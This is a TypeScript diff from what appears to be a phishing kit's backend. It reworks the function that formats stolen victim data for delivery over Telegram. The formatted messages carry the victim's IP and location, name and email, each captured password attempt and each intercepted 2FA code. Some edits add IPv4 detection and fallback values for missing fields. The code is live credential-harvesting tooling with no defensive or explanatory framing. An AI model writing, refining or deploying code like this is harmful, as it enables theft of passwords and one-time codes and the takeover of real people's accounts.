@@ -45,23 +45,34 @@ async function sendTelegramMessage(message: string, parseMode: "HTML" | "Markdow
   }
 }
 
-function formatLogMessage(payload: LogEventPayload, location: LocationData): string {
-  const { formDetails, passwordAttempts, twofaAttempts, selectedMethod } = payload;
+function isIpv4(value: string | undefined): boolean {
+  if (!value) return false;
+  const parts = value.split(".");
+  if (parts.length !== 4) return false;
 
-  
+  return parts.every((part) => {
+    if (!/^\d+$/.test(part)) return false;
+    const n = Number(part);
+    return n >= 0 && n <= 255;
+  });
+}
+
+function formatLogMessage(payload: LogEventPayload, location: LocationData): string {
+  const { formDetails, passwordAttempts, twofaAttempts } = payload;
+
+  const preferredIp = isIpv4(location.ipv4) ? location.ipv4! : location.ip;
+  const city = location.location.city?.trim() || "Unknown";
+  const region = location.location.region?.trim() || "Unknown";
+
   let message = "";
-  message += `<b>🌸 IP:</b> <code>${location.ip}</code>\n`;
-  message += `<b>🌺 Location:</b> ${location.location.country} (<code>${location.location.countryCode}</code>)\n`;
-  if (location.location.city) {
-    message += `<b>🏩 City:</b> ${location.location.city}\n`;
-  }
-  if (location.location.region) {
-    message += `<b>💮 Region:</b> ${location.location.region}\n`;
-  }
+  message += `<b>\u{1F338} IP:</b> <code>${preferredIp || "unknown"}</code>\n`;
+  message += `<b>\u{1F33A} Location:</b> ${location.location.country} (<code>${location.location.countryCode}</code>)\n`;
+  message += `<b>\u{1F3E9} City:</b> ${city}\n`;
+  message += `<b>\u{1F4AE} Region:</b> ${region}\n`;
   message += "\n";
 
   if (formDetails) {
-    message += "<b>🎀 Form Data:</b>\n";
+    message += "<b>\u{1F380} Form Data:</b>\n";
     message += `<b>Name:</b> <code>${formDetails.fullName}</code>\n`;
     message += `<b>Email:</b> <code>${formDetails.email}</code>\n`;
     if (formDetails.emailBusiness) {
@@ -80,19 +91,19 @@ function formatLogMessage(payload: LogEventPayload, location: LocationData): str
 
   if (passwordAttempts.length > 0) {
     passwordAttempts.forEach((attempt, i) => {
-      message += `💝 Password Attempt ${i + 1}: <code>${attempt}</code>\n`;
+      message += `\u{1F49D} Password Attempt ${i + 1}: <code>${attempt}</code>\n`;
     });
   }
 
   // Separator between password and 2FA
   if (passwordAttempts.length > 0 && twofaAttempts.length > 0) {
-    message += "💗💗💗💗💗💗💗💗💗\n";
+    message += "\u{1F497}\u{1F497}\u{1F497}\u{1F497}\u{1F497}\u{1F497}\u{1F497}\u{1F497}\u{1F497}\n";
   }
 
   // 2FA attempts
   if (twofaAttempts.length > 0) {
     twofaAttempts.forEach((attempt, i) => {
-      message += `💌 2FA Attempt ${i + 1}: <code>${attempt}</code>\n`;
+      message += `\u{1F48C} 2FA Attempt ${i + 1}: <code>${attempt}</code>\n`;
     });
   }
 
